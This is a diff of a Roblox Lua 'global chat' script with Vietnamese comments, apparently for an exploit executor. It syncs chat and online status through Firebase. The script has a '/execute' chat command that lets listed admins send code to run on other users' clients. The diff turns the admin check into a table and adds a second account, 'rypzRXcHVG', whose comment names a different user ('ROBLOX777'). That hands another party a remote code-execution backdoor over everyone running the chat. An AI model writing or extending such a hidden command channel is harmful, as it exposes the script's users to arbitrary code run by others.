@@ -1,4 +1,4 @@
--- Global Chat AltisLib (ONLINE TAB + HEARTBEAT + COMMAND + AUTO SCALE)
+-- Global Chat AltisLib (ADMIN TABLE + ONLINE TAB + HEARTBEAT + COMMAND + AUTO SCALE)
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -40,15 +40,15 @@ local Tab2 = Window:CreateTab("Điều khiển")
 local label1 = Tab2:CreateLabel("Chat Cooldown: 1s")
 Tab2:CreateDivider()
 
--- TAB 3: Người dùng [MỚI]
+-- TAB 3: Người dùng
 local Tab3 = Window:CreateTab("Người dùng")
 local lblAdminCount = Tab3:CreateLabel("[ADMIN] - 0 online")
-local SAdmin = Tab3:CreateSection("Danh sách Admin") -- Gom Admin vào 1 khu vực để không bị lộn xộn
+local SAdmin = Tab3:CreateSection("Danh sách Admin")
 
 Tab3:CreateDivider()
 
 local lblUserCount = Tab3:CreateLabel("User - 0 online")
-local SUser = Tab3:CreateSection("Danh sách User") -- Gom User vào 1 khu vực
+local SUser = Tab3:CreateSection("Danh sách User")
 
 ---------------------------------------------------
 -- LOGIC & VARIABLES
@@ -65,10 +65,16 @@ local MAX_UI_MESSAGES = 30
 local running = true
 local messageObjects = {}
 local seen = {}
-local onlineObjects = {} -- Lưu trữ Paragraph của người chơi Online
+local onlineObjects = {} 
 
--- CẤU HÌNH ADMIN
-local ADMIN_USERNAME = "hoang_huy1k9"
+-- ==========================================
+-- [CẬP NHẬT] HỆ THỐNG DANH SÁCH ADMIN (TABLE)
+-- ==========================================
+local ADMINS = {
+    ["hoang_huy1k9"] = true,
+    ["rypzRXcHVG"] = true -- Đã thêm ROBLOX777 vào danh sách Admin
+    -- Bạn có thể thêm người khác bằng cách copy dòng trên và đổi username
+}
 
 ---------------------------------------------------
 -- UTIL
@@ -90,22 +96,22 @@ end
 
 local function getSenderPrefix(msg)
     local role = ""
-    if msg.username == ADMIN_USERNAME then
+    -- Kiểm tra xem người gửi có nằm trong bảng Admin không
+    if ADMINS[msg.username] then
         role = "👑 [ADMIN] "
     end
     return role .. msg.displayName .. " (@" .. msg.username .. ") " .. now()
 end
 
 ---------------------------------------------------
--- HỆ THỐNG ONLINE/OFFLINE (HEARTBEAT) [MỚI]
+-- HỆ THỐNG ONLINE/OFFLINE (HEARTBEAT)
 ---------------------------------------------------
 local function updateOnlineStatus()
-    -- 1. Bắn tín hiệu "Mình đang online" lên Firebase
     task.spawn(function()
         local myData = {
             displayName = LocalPlayer.DisplayName,
             username = LocalPlayer.Name,
-            timestamp = os.time() -- Mốc thời gian hiện tại
+            timestamp = os.time() 
         }
         http_request({
             Url = FIREBASE_URL .. PATH_ONLINE .. LocalPlayer.UserId .. ".json",
@@ -115,7 +121,6 @@ local function updateOnlineStatus()
         })
     end)
 
-    -- 2. Lấy danh sách đang Online về
     local res = http_request({Url = FIREBASE_URL .. "globalchat/online.json", Method = "GET"})
     if not res or res.StatusCode ~= 200 then return end
 
@@ -126,19 +131,17 @@ local function updateOnlineStatus()
     local adminCount = 0
     local userCount = 0
 
-    -- Phân loại và kiểm tra độ trễ (Offline)
     for userId, user in pairs(data) do
         if type(user) == "table" and user.timestamp then
-            -- Nếu tín hiệu cuối cùng được gửi trong vòng 15 giây -> Đang Online
             if os.time() - user.timestamp <= 15 then
                 currentOnline[userId] = user
-                if user.username == ADMIN_USERNAME then
+                -- Phân loại đếm số lượng Admin / User
+                if ADMINS[user.username] then
                     adminCount = adminCount + 1
                 else
                     userCount = userCount + 1
                 end
             else
-                -- Nếu quá 15 giây không có tín hiệu -> Bị văng game / Đã thoát, xóa khỏi DB
                 task.spawn(function()
                     http_request({
                         Url = FIREBASE_URL .. PATH_ONLINE .. userId .. ".json",
@@ -149,14 +152,12 @@ local function updateOnlineStatus()
         end
     end
 
-    -- 3. Cập nhật số lượng lên Label
     lblAdminCount:SetText("[ADMIN] - " .. adminCount .. " online")
     lblUserCount:SetText("User - " .. userCount .. " online")
 
-    -- 4. Tạo Paragraph cho những người VỪA MỚI ONLINE
     for userId, user in pairs(currentOnline) do
         if not onlineObjects[userId] then
-            local isAdmin = (user.username == ADMIN_USERNAME)
+            local isAdmin = ADMINS[user.username] or false
             local formatName = user.displayName .. "(@" .. user.username .. ")"
             local p
             
@@ -170,7 +171,6 @@ local function updateOnlineStatus()
         end
     end
 
-    -- 5. Destroy() Paragraph của những người ĐÃ OFFLINE
     for userId, obj in pairs(onlineObjects) do
         if not currentOnline[userId] then
             pcall(function()
@@ -178,12 +178,11 @@ local function updateOnlineStatus()
                     obj.p:Destroy()
                 end
             end)
-            onlineObjects[userId] = nil -- Xóa khỏi bộ nhớ cục bộ
+            onlineObjects[userId] = nil 
         end
     end
 end
 
--- Khi người chơi chủ động thoát game -> Gửi lệnh xóa lập tức
 Players.PlayerRemoving:Connect(function(plr)
     if plr == LocalPlayer then
         http_request({
@@ -215,7 +214,8 @@ local function addMessage(key, msg)
 
     -- COMMAND SYSTEM
     if msg.message:match("^/execute") then
-        if msg.username == ADMIN_USERNAME then
+        -- Kiểm tra người gửi có quyền Admin không
+        if ADMINS[msg.username] then
             local target, code = msg.message:match('^/execute%s+"(.-)"%s+(.+)')
             if target and code then
                 if code:sub(1, 1) == '"' and code:sub(-1, -1) == '"' then code = code:sub(2, -2) end
@@ -348,9 +348,8 @@ local loopTick = 0
 coroutine.wrap(function()
     while running do
         updateCooldown()
-        fetch() -- Cập nhật tin nhắn (Mỗi 1 giây)
+        fetch() 
         
-        -- Cứ mỗi 3 giây thì gửi tín hiệu Online và cập nhật danh sách
         if loopTick % 3 == 0 then
             task.spawn(updateOnlineStatus)
         end
